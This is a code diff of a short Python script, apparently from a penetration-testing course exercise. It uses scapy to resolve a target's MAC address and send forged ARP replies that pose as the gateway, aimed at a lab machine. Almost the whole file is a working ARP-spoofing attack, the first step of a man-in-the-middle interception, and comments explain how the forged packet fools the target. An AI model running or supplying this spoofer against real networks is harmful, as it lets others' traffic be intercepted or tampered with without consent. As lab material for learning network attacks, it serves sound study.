@@ -1,8 +1,23 @@
 import scapy.all as scapy
 
-# creating a ARP package
-# the op=2 options means that we are creating a response instead of a request (request would be op=1)
-# pdst is the destination ip, we are setting it to the ip of our Windows VM (the target)
-# hwdst is the destination mac address, we are setting it to the mac of our Windows VM (the target)
-# psrc is the source ip field, we gonna set this to the router/gateway ip (remember, we are forging this packet), so the target will think this packet response is comming from the router
-packet = scapy.ARP(op=2, pdst="172.16.239.139", hwdst="00:0c:29:7a:48:f6", psrc="172.16.239.2")
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    # we want only the first element (since we are not asking for a ip range, but for a single ip)
+    # and the data we want will be at the index 1 of the found element
+    # the mac will be at the hwsrc key
+    return answered_list[0][1].hwsrc   
+  
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    
+    print(target_mac)
+    scapy.send(packet)
+
+
+spoof("172.16.239.139", "172.16.239.2")
